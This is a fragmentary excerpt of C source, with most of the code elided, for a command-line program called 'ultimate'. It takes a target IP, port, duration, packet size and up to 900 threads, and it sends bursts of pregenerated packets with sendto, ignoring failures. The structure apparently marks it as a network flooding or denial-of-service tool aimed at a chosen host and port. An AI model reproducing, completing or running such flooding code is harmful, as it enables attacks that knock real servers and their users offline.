        ...
        for (int i = 0; i < burst_size; i++) {
            if (!pregen_buffers[packet_index]) {
                ...
                if (sendto(sockfd, temp_packet, PACKET_SIZE, MSG_DONTWAIT,
                    ...
                    // Non-blocking socket, continue anyway
                }
            } else {
...
void usage() {
    printf("Usage: ./ultimate IP PORT TIME SIZE THREADS\n");
    printf("Example: ./ultimate 1.2.3.4 7777 60 64 500\n");
    printf("Time: 10-300s | Size: 20-128 | Threads: 1-900\n");
}
...
int main(int argc, char *argv[]) {
    ...
    if (THREAD_COUNT > 900) THREAD_COUNT = 900;
